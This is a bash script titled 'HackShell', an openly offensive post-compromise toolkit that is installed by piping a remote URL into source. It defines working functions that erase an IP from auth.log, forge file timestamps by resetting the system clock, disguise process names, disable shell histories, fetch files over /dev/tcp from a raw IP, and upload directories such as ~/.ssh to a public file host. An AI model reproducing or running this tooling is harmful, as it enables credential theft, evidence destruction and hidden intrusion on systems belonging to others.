#! /usr/bin/env bash

# HackShell - Post-Login shell configuration for hackers
#
# Configure the current shell to not create any files on the
# file system and set up some useful commands. Optionally download
# useful static binaries.
#
# Usage (memory only):
#     source <(curl -SsfL https://thc.org/hs)
# Usage with downloading binaries:
#     BIN=1 source <(curl -SsfL https://thc.org/hs)
#
# Environment variables:
#    XHOME=         Set custom XHOME directory instead of /dev/shm/.$'\t''~?$:?'
#
# https://github.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet/blob/master/tools/hackshell.sh
# 2024 by theM0ntarCann0n & skpr

CY="\033[1;33m" # yellow
CG="\033[1;32m" # green
CR="\033[1;31m" # red
CB="\033[1;34m" # blue
CM="\033[1;35m" # magenta
CC="\033[1;36m" # cyan
CDR="\033[0;31m" # red
CDG="\033[0;32m" # green
CDY="\033[0;33m" # yellow
CDM="\033[0;35m"
CDC="\033[0;36m" # cyan
CF="\033[2m"    # faint
CN="\033[0m"    # none
CW="\033[1;37m"


### Functions to keep in memory
HS_ERR() { echo -e >&2 "${CR}ERROR: ${CDR}$*${CN}"; }
HS_WARN() { echo -e >&2 "${CY}WARN: ${CDM}$*${CN}"; }
xlog() { local a=$(sed "/${1:?}/d" <"${2:?}") && echo "$a" >"${2:?}"; }
xsu() {
    local name="${1:?}"
    local u g h
    [ $UID -ne 0 ] && { HS_ERR "Need root"; return; }
    u=$(id -u ${name:?}) || return
    g=$(id -g ${name:?}) || return
    h="$(grep "$U" /etc/passwd | cut -d: -f6)" || return
    HOME="${h:-/tmp}" python3 -c "import os;os.setgid(${g:?});os.setuid(${u:?});os.execlp('bash', 'bash')"
}

xtmux() {
    local sox="${TMPDIR}/.tmux-${UID}"
    # Can not live in XHOME because XHOME is wiped on exit()
    tmux -S "${sox}" "$@"
    command -v fuser >/dev/null && { fuser "${sox}" || rm -f "${sox}"; }
}

xssh() {

    local ttyp
    echo -e "May need to cut & paste:${CDC}
reset -I
PS1='"'\[\\033[36m\]\\u\[\\033[m\]@\[\\033[32m\]\\h:\[\\033[33;1m\]\\w\[\\033[m\]\\$ '"'
"'stty -echo;printf "\\033[18t";read -t5 -rdt R;stty sane $(echo "$R"|awk -F";" '"'"'{ printf "rows "$3" cols "$2; }'"'"')'"${CN}"
    ttyp=$(stty -g)
    stty raw -echo opost
    ssh "${HS_SSH_OPT[@]}" -T \
        "$@" \
        "unset SSH_CLIENT SSH_CONNECTION; TERM=xterm-256color HISTFILE=/dev/null BASH_HISTORY=/dev/null exec -a [ntp] script -qc 'exec -a [uid] bash -i' /dev/null"
    stty "${ttyp}"
}

burl() {
    IFS=/ read -r proto x host query <<<"$1"
    exec 3<>"/dev/tcp/${host}/${PORT:-80}"
    echo -en "GET /${query} HTTP/1.0\r\nHost: ${host}\r\n\r\n" >&3
    (while read -r l; do echo >&2 "$l"; [[ $l == $'\r' ]] && break; done && cat ) <&3
    exec 3>&-
}
# burl http://ipinfo.io
# PORT=31337 burl http://37.120.235.188/blah.tar.gz >blah.tar.gz

# Execute a command without changing file's ctime/mtime/atime
# notime <reference file> <cmd> ...
# - notime . rm -f foo.dat
# - notime foo chmod 700 foo
notime() {
    local ref="$1"
    local now

    [[ $# -le 1 ]] && { echo >&2 "notime <reference file> <cmd> ..."; return 255; }
    [[ ! -e "$ref" ]] && { echo >&2 "File not found: $ref"; return 255; }
    [ $UID -ne 0 ] && { HS_ERR "Need root"; return 255; }

    shift 1
    now=$(date -Ins) || return
    date --set="$(date -Ins -r "$ref")" >/dev/null || return
    "$@"
    date --set="$now" >/dev/null || return
}


# Presever mtime, ctime and birth-time as best as possible.
# notime_cp <src> <dst>
notime_cp() {
    local src="$1"
    local dst="$2"
    local now
    local olddir_date
    local dir

    [[ -z "$UID" ]] && UID="$(id -u)"
    [[ ! -f "$src" ]] && { echo >&2 "Not found: $src"; return 255; }
    if [[ -d "$dst" ]]; then
        dir="$dst"
        dst+="/$(basename "$src")"
    else
        dir="$(dirname "$dst")"
    fi
    # If dst exists then keep dst's time (otherwise use time of src)
    [[ -f "$dst" ]] && {
        # Make src identical to dst (late set dst to src).
        touch -r "$dst" "$src"
        chmod --reference "$dst" "$src"
    }

    olddir_date="$(date +%Y%m%d%H%M.%S -r "$dir")" || return
    [[ ! -e "$dst" ]] && {
        [[ "$UID" -eq 0 ]] && {
            now=$(date -Ins)
            date --set="$(date -Ins -r "$src")" >/dev/null || return
            touch "$dst"
            chmod --reference "$src" "$dst"
            touch -t "$olddir_date" "$dir"  # Changes ctime
            chmod --reference "$dir" "$dir" # Fixes ctime
            # [[ -n "$now" ]] && 
            date --set="$now" >/dev/null
            unset olddir_date
        }
    }

    cat "$src" >"$dst"
    chmod --reference "$src" "$dst"
    touch -r "$src" "$dst"

    [[ "$UID" -ne 0 ]] && {
        # Normal users can't change date to the past.
        touch -t "${olddir_date:?}" "$dir"
        return
    }
    now=$(date -Ins) || return
    date --set="$(date -Ins -r "$src")" || return
    chmod --reference "$dst" "$dst"   # Fixes ctime
    date --set="$now"
}

resolv() { while read -r x; do r="$(getent hosts "$x")" || continue; echo "${r%% *}"$'\t'"${x}"; done; }
find_subdomains() {
	local d="${1//./\\.}"
	local rexf='[0-9a-zA-Z_.-]{0,64}'"${d}"
	local rex="$rexf"'([^0-9a-zA-Z_]{1}|$)'
	[ $# -le 0 ] && { echo -en >&2 "Extract sub-domains from all files (or stdin)\nUsage  : find_subdomains <apex-domain> <file>\nExample: find_subdomain .com | anew"; return; }
	shift 1
	[ $# -le 0 ] && [ -t 0 ] && set -- .
	command -v rg >/dev/null && { rg -oaIN --no-heading "$rex" "$@" | grep -Eao "$rexf"; return; }
	grep -Eaohr "$rex" "$@" | grep -Eo "$rexf"
}

# HS_TRANSFER_PROVIDER="transfer.sh"
HS_TRANSFER_PROVIDER="oshi.at"

transfer() {
    [[ $# -eq 0 ]] && { echo -e >&2 "Usage:\n    transfer [file/directory]\n    transfer [name] <FILENAME"; return 255; }
    [[ ! -t 0 ]] && { curl -SsfL --progress-bar -T "-" "https://${HS_TRANSFER_PROVIDER}/${1}"; return; }
    [[ ! -e "$1" ]] && { echo -e >&2 "Not found: $1"; return 255; }
    [[ -d "$1" ]] && { (cd "${1}/.."; tar cfz - "${1##*/}")|curl -SsfL --progress-bar -T "-" "https://${HS_TRANSFER_PROVIDER}/${1##*/}.tar.gz"; return; }
    curl -SsfL --progress-bar -T "$1" "https://${HS_TRANSFER_PROVIDER}/${1##*/}"
}

# SHRED without shred command
command -v shred >/dev/null || shred() {
    [[ -z $1 || ! -f "$1" ]] && { echo >&2 "shred [FILE]"; return 255; }
    dd status=none bs=1k count=$(du -sk ${1:?} | cut -f1) if=/dev/urandom >"$1"
    rm -f "${1:?}"
}

# Keep this seperate because this actually creates data.
mk() {
    mkdir -p "${XHOME:?}" 2>/dev/null
    export HOME="${XHOME}"
    echo -e "${CDM}HOME set to ${CDY}${XHOME}${CN} ${CF}[will auto-destruct on exit]${CN}"
    echo -e "Undo with ${CDC}export HOME='${_HS_HOME_ORIG}'${CN}"
}

bin() {
    mkdir -p "${XHOME}" 2>/dev/null
    export PATH="${XHOME}:$PATH"

    HS_WARN "NOT YET IMPLEMENTED"
}

hs_exit() {
    cd /tmp || cd /dev/shm || cd /
    [ -n "$XHOME" ] && [ -d "$XHOME" ] && rm -rf "${XHOME:?}"
    [ -t 1 ] && echo -e "${CW}>>>>> 📖 More tips at https://thc.lorg/tips${CN} 😘"
    kill -9 $$
}

[ -z "$BASH" ] && TRAPEXIT() { hs_exit; } #zsh

### Functions (temporary)
hs_init() {
    local a
    local prg="$1"

    [ -z "$BASH" ] && { HS_WARN "Shell is not BASH. Try:
${CY}>>>>> ${CDC}curl -obash -SsfL 'https://bin.ajam.dev/$(uname -m)/bash && chmod 700 bash && exec bash -il'"; }
    [ -n "$BASH" ] && [ "${prg##*\.}" = "sh" ] && { HS_ERR "Use ${CDC}source $prg${CDR} instead"; sleep 2; exit 255; }
    [ -z "$UID" ] && UID="$(id -u)"
    [ -n "$_HS_HOME_ORIG" ] && export HOME="$_HS_HOME_ORIG"
    export _HS_HOME_ORIG="$HOME"

    if [ -n "$BASH" ]; then
        trap hs_exit EXIT SIGHUP SIGTERM SIGPIPE
    else
        trap hs_exit SIGHUP SIGTERM SIGPIPE
    fi

    HS_SSH_OPT=()
    command -v ssh >/dev/null && {
        [[ $(ssh -V 2>&1) == OpenSSH_[67]* ]] && a="no"
        HS_SSH_OPT+=("-oStrictHostKeyChecking=${a:-accept-new}")
        # HS_SSH_OPT+=("-oUpdateHostKeys=no")
        HS_SSH_OPT+=("-oUserKnownHostsFile=/dev/null")
        HS_SSH_OPT+=("-oKexAlgorithms=+diffie-hellman-group1-sha1")
        HS_SSH_OPT+=("-oHostKeyAlgorithms=+ssh-dss")
    }
}

hs_init_alias() {
    alias ssh="ssh ${HS_SSH_OPT[*]}"
    alias scp="scp ${HS_SSH_OPT[*]}"
    alias wget='wget --no-hsts'
    alias vi="vi -i NONE"
    alias vim="vim -i NONE"
    alias screen="screen -ln"
}

hs_init_shell() {
    unset HISTFILE
    [ -n "$BASH" ] && export HISTFILE="/dev/null"
    export BASH_HISTORY="/dev/null"
    export LANG=C.UTF-8
    locale -a 2>/dev/null|grep -Fqim1 C.UTF || export LANG=C
    export LESSHISTFILE=-
    export REDISCLI_HISTFILE=/dev/null
    export MYSQL_HISTFILE=/dev/null
    export T=.$'\t''~?$?'
    TMPDIR="/tmp"
    [ -d "/var/tmp" ] && TMPDIR="/var/tmp"
    [ -d "/dev/shm" ] && TMPDIR="/dev/shm"
    export TMPDIR
    [ -z "$XHOME" ] && export XHOME="${TMPDIR}/${T}"

    export PATH=".:${PATH}"
    # PS1='USERS=$(who | wc -l) LOAD=$(cut -f1 -d" " /proc/loadavg) PS=$(ps -e --no-headers|wc -l) \e[36m\u\e[m@\e[32m\h:\e[33;1m\w \e[0;31m\$\e[m '
    if [[ "$SHELL" == *"zsh" ]]; then
        PS1='%F{red}%n%f@%F{cyan}%m %F{magenta}%~ %(?.%F{green}.%F{red})%#%f '
    else
        PS1='\[\033[36m\]\u\[\033[m\]@\[\033[32m\]\h:\[\033[33;1m\]\w\[\033[m\]\$ '
    fi
}

xhelp() {
    # Output help
    echo -en "\
${CDC} xlog '1\.2\.3\.4' /var/log/auth.log   ${CDM}Cleanse log file
${CDC} xsu username                          ${CDM}Switch user
${CDC} xtmux                                 ${CDM}Start 'hidden' tmux
${CDC} xssh                                  ${CDM}Silently log in to remote host
${CDC} burl http://ipinfo.io 2>/dev/null     ${CDM}Request URL ${CN}${CF}[no https support]
${CDC} transfer ~/.ssh                       ${CDM}Upload a file or directory ${CN}${CF}[${HS_TRANSFER_PROVIDER}]
${CDC} shred file                            ${CDM}Securely delete a file
${CDC} notime <file> rm -f foo.dat           ${CDM}Exec ${CDC}command${CDM} at mtime of <file>
${CDC} notime_cp <src> <dst>                 ${CDM}Copy file. Keep birth-time, ctime, mtime & atime
${CDC} find_subdomain .foobar.com            ${CDM}Search files for sub-domain
${CDC} bin                                   ${CDM}Download useful static binaries
${CDC} xhelp                                 ${CDM}This help"
    echo -e "${CN}"
}


### Programm
hs_init "$0"
hs_init_alias
hs_init_shell
xhelp

### Finishing
str=""
[ -z "$BIN" ] && {
    echo -e "Type ${CDC}mk${CN} to use HOME=${CDY}${XHOME}${CN}"
    str="Memory only. The filesystem is UNTOUCHED."
}
echo -e ">>> ${CG}Setup complete. ${CF}${str}${CN}"

# unset all functions that are no longer needed.
unset -f hs_init hs_init_alias hs_init_shell
unset BIN str SSH_CONNECTION SSH_CLIENT
